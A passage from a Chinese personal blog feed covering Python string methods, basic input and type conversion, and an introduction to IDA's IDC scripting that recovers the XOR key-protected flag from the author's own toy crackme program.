routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mystr</span>=<span class="string">"hello world and itcast and itheima and Python"</span></span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(mystr.index(<span class="string">'and'</span>))# 12</span><br><span class="line"><span class="builtin-name">print</span>(mystr.index(<span class="string">'and'</span>,15,30))# 23</span><br><span class="line"><span class="builtin-name">print</span>(mystr.index(<span class="string">'ands'</span>))#  ValueError: substring <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure><h4 id="count"><a href="#count" class="headerlink" title="count()"></a>count()</h4><blockquote><p>返回某个字串在字符串中出现的次数</p></blockquote><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mystr=<span class="string">"hello world and itcast and itheima and Python"</span></span><br><span class="line"></span><br><span class="line">print(<span class="name">mystr</span>.count('and',<span class="number">15</span>,<span class="number">30</span>))#1</span><br><span class="line">print(<span class="name">mystr</span>.count('and')) #3</span><br><span class="line">print(<span class="name">mystr</span>.count('ands')) #0</span><br></pre></td></tr></table></figure><blockquote><p>rfind()：和find()功能相同，但查找方向从右侧开始</p></blockquote><blockquote><p>rindex()：和index()功能相同，但查找方向从右侧开始</p></blockquote><h3 id="修改操作"><a href="#修改操作" class="headerlink" title="修改操作"></a>修改操作</h3><blockquote><p>字符串修改，就是通过函数的形式修改字符串中的数据。</p></blockquote><ul><li>replace()：替换<blockquote><p>语法：</p></blockquote></li></ul><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符串序列.<span class="built_in">replace</span>(旧字串,新字串,替换次数)</span><br></pre></td></tr></table></figure><blockquote><p>注意：替换次数如果超过子串出现次数，则替换次数为该次数出现的次数。</p></blockquote><blockquote><p>例子：</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mystr=<span class="string">"hello world and itcast and itheima and Python"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(mystr.replace(<span class="string">'and'</span>,<span class="string">'he'</span>)</span></span>)  #replace()返回值是 修改后的字符串</span><br><span class="line"><span class="selector-id">#hello</span> world he itcast he itheima he Python</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(mystr.replace(<span class="string">'and'</span>,<span class="string">'he'</span>,<span class="number">1</span>)</span></span>)#只替换一次</span><br><span class="line"><span class="selector-id">#hello</span> world he itcast and itheima and Python</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(mystr.replace(<span class="string">'and'</span>,<span class="string">'he'</span>,<span class="number">10</span>)</span></span>)</span><br><span class="line">#替换次数(<span class="number">10</span>)如果超过子串出现次数(<span class="number">3</span>)，则替换次数为该次数出现的次数(<span class="number">3</span>)</span><br><span class="line"><span class="selector-id">#hello</span> world he itcast he itheima he Python</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(mystr)</span></span></span><br><span class="line"><span class="selector-id">#hello</span> world and itcast and itheima and Python</span><br></pre></td></tr></table></figure><blockquote><p>调用replace函数后，原字符串的数据没有变化，说明 字符串是不可变数据类型</p></blockquote><blockquote><p>数据是否改变划分为   可变类型  和 不可变类型</p></blockquote><h4 id="split-："><a href="#split-：" class="headerlink" title="split()："></a>split()：</h4><blockquote><p>按照指定字符分割字符串，返回一个列表</p></blockquote><blockquote><p>语法：字符串序列.split(分割字符,num)</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mystr</span>=<span class="string">"hello world and itcast and itheima and Python"</span></span><br><span class="line"><span class="comment">#split()    分割，返回一个列表，丢失分割字符</span></span><br><span class="line"><span class="attribute">list1</span>=mystr.split('and')</span><br><span class="line"><span class="builtin-name">print</span>(list1)#[<span class="string">'hello world '</span>, <span class="string">' itcast '</span>, <span class="string">' itheima '</span>, <span class="string">' Python'</span>]</span><br><span class="line"><span class="attribute">list2</span>=mystr.split('and',2)</span><br><span class="line"><span class="builtin-name">print</span>(list2)#[<span class="string">'hello world '</span>, <span class="string">' itcast '</span>, <span class="string">' itheima and Python'</span>]</span><br></pre></td></tr></table></figure><h4 id="join"><a href="#join" class="headerlink" title="join()"></a>join()</h4><blockquote><p>用一个字符或子串合并字符串，即是将多个字符串合并为一个新的字符串</p></blockquote><blockquote><p>语法：字符或子串.join(多字符串组成的序列)</p></blockquote><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#join()   合并列表里的字符串数据为1个大字符串</span></span><br><span class="line">mylist=[<span class="string">'aa'</span>,<span class="string">'bb'</span><span class="string">'[cc'</span>]</span><br><span class="line"><span class="keyword">new</span><span class="type">_str</span>=<span class="string">'...'</span>.join(mylist)</span><br><span class="line">print(<span class="keyword">new</span><span class="type">_str</span>)</span><br><span class="line"><span class="meta">#aa...bb...cc</span></span><br></pre></td></tr></table></figure><h4 id="strip-lstrip-rstrip"><a href="#strip-lstrip-rstrip" class="headerlink" title="strip()  lstrip()  rstrip()"></a>strip()  lstrip()  rstrip()</h4><blockquote><p>删除字符串空白字符</p></blockquote><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mystr=<span class="string">"      hello world and itcast and itheima and Python        "</span></span><br><span class="line"><span class="keyword">new</span><span class="type">_str1</span>=mystr.lstrip()<span class="meta">#删除左侧空白字符</span></span><br><span class="line"></span><br><span class="line">print(<span class="keyword">new</span><span class="type">_str1</span>)</span><br><span class="line"><span class="keyword">new</span><span class="type">_str2</span>=mystr.rstrip()<span class="meta">#删除右侧空白字符</span></span><br><span class="line">print(<span class="keyword">new</span><span class="type">_str2</span>)</span><br><span class="line"><span class="keyword">new</span><span class="type">_str3</span>=mystr.strip()<span class="meta">#删除左右两侧空白字符</span></span><br><span class="line">print(<span class="keyword">new</span><span class="type">_str3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta"># hello world and itcast and itheima and Python        </span></span><br><span class="line"><span class="meta">#       hello world and itcast and itheima and Python</span></span><br><span class="line"><span class="meta"># hello world and itcast and itheima and Python</span></span><br></pre></td></tr></table></figure><blockquote><p>字符串大小写转换：</p></blockquote><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mystr=<span class="string">"hello world and itcast and itheima and Python"</span></span><br><span class="line"><span class="keyword">new</span><span class="type">_str1</span>=mystr.capitalize()<span class="meta">#字符串首字母大写</span></span><br><span class="line">print(<span class="keyword">new</span><span class="type">_str1</span>)</span><br><span class="line"><span class="meta"># Hello world and itcast and itheima and python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span><span class="type">_str2</span>=mystr.title()<span class="meta">#字符串每个字符首字母大写</span></span><br><span class="line">print(<span class="keyword">new</span><span class="type">_str2</span>)</span><br><span class="line"><span class="meta"># Hello World And Itcast And Itheima And Python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span><span class="type">_str3</span>=mystr.upper()<span class="meta">#小写转大写</span></span><br><span class="line">print(<span class="keyword">new</span><span class="type">_str3</span>)</span><br><span class="line"><span class="meta"># HELLO WORLD AND ITCAST AND ITHEIMA AND PYTHON</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span><span class="type">_str4</span>=mystr.lower()<span class="meta">#大写转小写</span></span><br><span class="line">print(<span class="keyword">new</span><span class="type">_str4</span>)</span><br><span class="line"><span class="meta"># hello world and itcast and itheima and python</span></span><br></pre></td></tr></table></figure><h4 id="ljust-rjust-center"><a href="#ljust-rjust-center" class="headerlink" title="ljust() rjust() center()"></a>ljust() rjust() center()</h4><blockquote><p>返回一个原字符串左(右，居中对齐)，并使用指定字符(默认空格)填充至对应长度的新字符串</p></blockquote><blockquote><p>语法:字符串序列.ljust(长度,填充字符)</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mystr = <span class="string">'hello'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(mystr.ljust(<span class="number">10</span>)</span></span>)<span class="selector-id">#hello</span>       默认填充字符是 空格</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(mystr.ljust(<span class="number">10</span>,<span class="string">'.'</span>)</span></span>)<span class="selector-id">#hello</span>.....</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(mystr.rjust(<span class="number">10</span>,<span class="string">'.'</span>)</span></span>)#.....hello</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(mystr.center(<span class="number">10</span>,<span class="string">'.'</span>)</span></span>)#.<span class="selector-class">.hello</span>...     不是绝对居中</span><br></pre></td></tr></table></figure><blockquote><p>要注意字符串是不可变类型，所以需要新的变量接受它！</p></blockquote><h3 id="判断操作"><a href="#判断操作" class="headerlink" title="判断操作"></a>判断操作</h3><blockquote><p>判断真假，返回bool型类型：True或False</p></blockquote><h4 id="startswith"><a href="#startswith" class="headerlink" title="startswith():"></a>startswith():</h4><blockquote><p>检查字符串是否是以指定子串开头，是 返回True 不然 False。如果设置开始结束位置下标，则在指定范围内检查</p></blockquote><blockquote><p>语法：字符串序列.startwith(子串,开始位置下表，结束位置下标)</p></blockquote><h4 id="endswith"><a href="#endswith" class="headerlink" title="endswith():"></a>endswith():</h4><blockquote><p>同上：</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mystr =<span class="string">"hello world and itcast and itheima and Python"</span></span><br><span class="line">#startswith():检查字符串是否是以指定子串开头</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(mystr.startswith(<span class="string">'hello'</span>)</span></span>)#True</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(mystr.startswith(<span class="string">'hel'</span>)</span></span>)#True</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(mystr.startswith(<span class="string">'hels'</span>)</span></span>)#False</span><br><span class="line"></span><br><span class="line">#endswith():检查字符串是否是以指定子串结尾</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(mystr.endswith(<span class="string">'Python'</span>)</span></span>)#True</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(mystr.endswith(<span class="string">'Pythons'</span>)</span></span>)#False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(mystr.endswith(<span class="string">'python'</span>)</span></span>)<span class="selector-id">#False</span>     大小写敏感</span><br></pre></td></tr></table></figure><h4 id="isalpha"><a href="#isalpha" class="headerlink" title="isalpha():"></a>isalpha():</h4><blockquote><p>如果字符串中（至少一个字符）并且所有字符都是字母则返回True，否则返回False</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mystr1</span>=<span class="string">'hello'</span></span><br><span class="line"><span class="attribute">mystr2</span>=<span class="string">'hello123'</span></span><br><span class="line"><span class="builtin-name">print</span>(mystr1.isalpha())#<span class="literal">True</span></span><br><span class="line"><span class="builtin-name">print</span>(mystr2.isalpha())#<span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="isdigit"><a href="#isdigit" class="headerlink" title="isdigit():"></a>isdigit():</h4><blockquote><p>如果字符串中（至少一个字符）并且所有字符都是数字则返回True，否则返回False</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mystr1</span>=<span class="string">'hello'</span></span><br><span class="line"><span class="attribute">mystr2</span>=<span class="string">'123'</span></span><br><span class="line"><span class="builtin-name">print</span>(mystr1.isdigit())#<span class="literal">False</span></span><br><span class="line"><span class="builtin-name">print</span>(mystr2.isdigit())#<span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="isalnum"><a href="#isalnum" class="headerlink" title="isalnum():"></a>isalnum():</h4><blockquote><p>如果字符串中（至少一个字符）并且所有字符都是数字或者字母则返回True，否则返回False</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mystr1</span>=<span class="string">'helloworld!'</span></span><br><span class="line"><span class="attribute">mystr2</span>=<span class="string">'hello123'</span></span><br><span class="line"><span class="builtin-name">print</span>(mystr1.isalnum())#<span class="literal">False</span> !不是字母送一<span class="literal">False</span></span><br><span class="line"><span class="builtin-name">print</span>(mystr2.isalnum())#<span class="literal">True</span></span><br></pre></td></tr></table></figure><h4 id="isspace"><a href="#isspace" class="headerlink" title="isspace():"></a>isspace():</h4><blockquote><p>如果字符串中（至少一个字符）并且所有字符都是空白则返回True，否则返回False</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mystr1</span>=<span class="string">'        '</span></span><br><span class="line"><span class="attribute">mystr2</span>=<span class="string">'chkds 65 622'</span></span><br><span class="line"><span class="builtin-name">print</span>(mystr1.isspace())#<span class="literal">True</span> 制表符 也属于空白</span><br><span class="line"><span class="builtin-name">print</span>(mystr2.isspace())#<span class="literal">False</span></span><br></pre></td></tr></table></figure><p>我可以的，啊！<br><img src="https://s2.ax1x.com/2019/09/19/nOs2TJ.jpg" alt="nOs2TJ.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;迷茫了快，不能这个样子！&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>idc脚本</title>
    <link href="http://yoursite.com/2019/09/18/idc%E8%84%9A%E6%9C%AC/"/>
    <id>http://yoursite.com/2019/09/18/idc脚本/</id>
    <published>2019-09-18T15:51:43.000Z</published>
    <updated>2019-09-18T16:19:47.546Z</updated>
    
    <content type="html"><![CDATA[<p>半成品，有些累了！明天要将它完善！</p><a id="more"></a><h1 id="idc预备基础知识"><a href="#idc预备基础知识" class="headerlink" title="idc预备基础知识"></a>idc预备基础知识</h1><blockquote><p>首先看下了解下执行脚本的常用打开方法</p></blockquote><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">File</span>-&gt;<span class="keyword">Script</span> <span class="keyword">File</span>:运行独立脚本</span><br><span class="line"><span class="keyword">File</span>-&gt;IDC Command</span><br><span class="line"><span class="keyword">File</span>-&gt;Python Command</span><br><span class="line"></span><br><span class="line">//另外，之前运行过的脚本可以在View-&gt;Rencent <span class="keyword">Script</span> 找到</span><br></pre></td></tr></table></figure><blockquote><p>如果想执行一个临时写的脚本(不长久保存可以在使用IDC Command窗口)或者是输出窗口下面的IDC单行命令行（其实也可以执行多行命令，只需用分号 隔开就好）</p></blockquote><h1 id="IDC语言"><a href="#IDC语言" class="headerlink" title="IDC语言"></a>IDC语言</h1><blockquote><p>ID脚本语言 类似 C语言，C++，并且有着很多IDC函数，很有用！</p></blockquote><h2 id="IDC变量"><a href="#IDC变量" class="headerlink" title="IDC变量"></a>IDC变量</h2><blockquote><p>IDC是一种类型松散的语言，这表示它的变量没有明确的类型。IDC使用3种数据类型，整形(long),字符串，和浮点型。从IDA5.6开始，IDC又加入了许多变量类型，包括对象，引用，和函数指针。</p></blockquote><blockquote><p>声明变量：使用任何变量前都必须声明变量</p></blockquote><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//<span class="type">IDC</span>关键字<span class="built_in">auto</span> 用于引用一个局部变量</span><br><span class="line"><span class="built_in">auto</span> <span class="keyword">addr</span>;</span><br><span class="line"><span class="built_in">auto</span> reg,val;</span><br><span class="line"><span class="built_in">auto</span> count=<span class="number">0</span>;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//IDC关键字autoextern用于引用一个全局变量</span></span><br><span class="line"><span class="keyword">extern</span> outsideGlobal;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">extern</span> insideGlobal;</span><br><span class="line">    outsideGlobal=<span class="string">"Global"</span>;</span><br><span class="line">    insideGlobal=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里要注意，用户自己定义的函数只能运行独立脚本的时候才有效。</span></span><br></pre></td></tr></table></figure><h1 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h1><p>我们用VS2015 生成下release版本的32程序，然后ida打开分析。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">//the xor key is 'B' ，异或的key</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Verify</span><span class="params">(<span class="keyword">char</span> *Flag)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">int</span> tar[<span class="number">10</span>] = &#123; <span class="number">00</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">29</span>, <span class="number">14</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">10</span>, <span class="number">29</span>, <span class="number">1</span> &#125;; <span class="comment">//这里是关键数据</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (Flag[i] != tar[i]) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"You are wrong\n"</span>); <span class="comment">//错误提示</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Congratulations...\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">11</span>] = <span class="string">"\0"</span>;</span><br><span class="line">scanf_s(<span class="string">"%s"</span>, flag, <span class="keyword">sizeof</span>(flag));<span class="comment">//输入的flag</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>, flag);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">flag[i] = flag[i] ^ <span class="number">66</span>; <span class="comment">//将输入异或</span></span><br><span class="line">&#125;</span><br><span class="line">Verify(flag);<span class="comment">//调用检测函数</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>明天继续编辑吧！有些累了！关键数据在数据段的00102140 和 00402150</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rdata:00402100                                         ; DATA XREF: ___report_gsfailure+ED↑o</span><br><span class="line">.rdata:00402108 aYouAreWrong    db <span class="string">'You are wrong'</span>,0Ah,0</span><br><span class="line">.rdata:00402108                                         ; DATA XREF: _main:loc_4010A8↑o</span><br><span class="line">.rdata:00402117                <span class="built_in"> align </span>4</span><br><span class="line">.rdata:00402118 aCongratulation db <span class="string">'Congratulations...'</span>,0Ah,0</span><br><span class="line">.rdata:00402118                                         ; DATA XREF: _main+A1↑o</span><br><span class="line">.rdata:0040212C aS              db <span class="string">'%s'</span>,0               ; DATA XREF: _main+22↑o</span><br><span class="line">.rdata:0040212F                <span class="built_in"> align </span>10h</span><br><span class="line">.rdata:00402130 aS_0            db <span class="string">'%s'</span>,0Ah,0           ; DATA XREF: _main+35↑o</span><br><span class="line">.rdata:00402134                <span class="built_in"> align </span>10h</span><br><span class="line">.rdata:00402140 xmmword_402140  xmmword 0A0000002F0000002F0000000Eh</span><br><span class="line">.rdata:00402140                                         ; DATA XREF: _main+7E↑r</span><br><span class="line">.rdata:00402150 xmmword_402150  xmmword 1D0000002C0000002B00000000h</span><br><span class="line">.rdata:00402150                                         ; DATA XREF: _main+3F↑r</span><br><span class="line">.rdata:00402160 ; <span class="builtin-name">Debug</span> Directory entries</span><br><span class="line">.rdata:00402160                 dd 0                    ; Characteristics</span><br></pre></td></tr></table></figure><h2 id="我们使用idc编写脚本（很方便）"><a href="#我们使用idc编写脚本（很方便）" class="headerlink" title="我们使用idc编写脚本（很方便）"></a>我们使用idc编写脚本（很方便）</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">auto from1 = <span class="number">0x00402150</span>;</span><br><span class="line">auto from2 = <span class="number">0x00402140</span>;</span><br><span class="line">auto i,x;</span><br><span class="line"></span><br><span class="line">for(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i=i+<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x=Dword(from1);</span><br><span class="line">        Message(<span class="string">"%s"</span>,x^<span class="number">0x42</span>);</span><br><span class="line">        from1=from1+<span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">for(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i=i+<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x=Dword(from2);</span><br><span class="line">        Message(<span class="string">"%s"</span>,x^<span class="number">0x42</span>);</span><br><span class="line">        from2=from2+<span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">Message(<span class="string">"%s"</span>,<span class="number">0x1D</span>^<span class="number">0x42</span>);</span><br><span class="line">Message(<span class="string">"%s"</span>,<span class="number">0x01</span>^<span class="number">0x42</span>);</span><br><span class="line">#Bin_LmmH_C</span><br></pre></td></tr></table></figure><p>参考<a href="https://www.cnblogs.com/binlmmhc/p/6166286.html更详细" target="_blank" rel="noopener">https://www.cnblogs.com/binlmmhc/p/6166286.html更详细</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;半成品，有些累了！明天要将它完善！&lt;/p&gt;
    
    </summary>
    
    
      <category term="re" scheme="http://yoursite.com/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>python系统学习1</title>
    <link href="http://yoursite.com/2019/09/17/python%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A01/"/>
    <id>http://yoursite.com/2019/09/17/python系统学习1/</id>
    <published>2019-09-16T16:22:35.000Z</published>
    <updated>2019-09-17T16:39:15.326Z</updated>
    
    <content type="html"><![CDATA[<p>其实，今天让我心里感到安慰的是  学会了使用idc dump数据！但明天再整理吧！</p><a id="more"></a><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p>语法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">input</span><span class="params">(<span class="string">"提示信息"</span>)</span></span></span><br></pre></td></tr></table></figure><p>输入特点：</p><ol><li>当程序执行到input，等待用户输入，输入完成后才可以继续向下执行</li><li>在python中，input接受用户输入后，一般存储到变量，方便使用</li><li>input会把接收到的任意输入的数据当成字符串处理</li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">password</span>=input('请输入您的密码：')</span><br><span class="line"><span class="builtin-name">print</span>(f<span class="string">'您输入的密码是&#123;password&#125;'</span>)</span><br><span class="line"><span class="builtin-name">print</span>(type(password))</span><br><span class="line"><span class="comment"># 请输入您的密码：123456</span></span><br><span class="line"><span class="comment"># # 您输入的密码是123456</span></span><br><span class="line"><span class="comment"># # &lt;class 'str'&gt;</span></span><br></pre></td></tr></table></figure><h2 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>int(x,[base])</td><td>将x转换为一个整数</td></tr><tr><td>float(x)</td><td>将x转换为一个浮点数</td></tr><tr><td>complex(real[,imag])</td><td>创建一个复数，real为实部，imag为虚部</td></tr><tr><td>str(x)</td><td>将对象转化为字符串</td></tr><tr><td>repr(x)</td><td>将对象转换为表达式字符串</td></tr><tr><td>eval(str)</td><td>用来计算在字符串中的有效Python表达式，并返回一个对象</td></tr><tr><td>tuple(s)</td><td>将序列s 转换为一个元组</td></tr><tr><td>list(s)</td><td>将序列s转换为一个表格</td></tr><tr><td>chr(x)</td><td>将一个整数转换为一个Unicode字符</td></tr><tr><td>ord(x)</td><td>将一个字符转换为它的ASCII整数值</td></tr><tr><td>hex(x)</td><td>将一个整数转换为一个十六进制字符串</td></tr><tr><td>row 1 col 1</td><td>row 1 col 2</td></tr></tbody></table><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 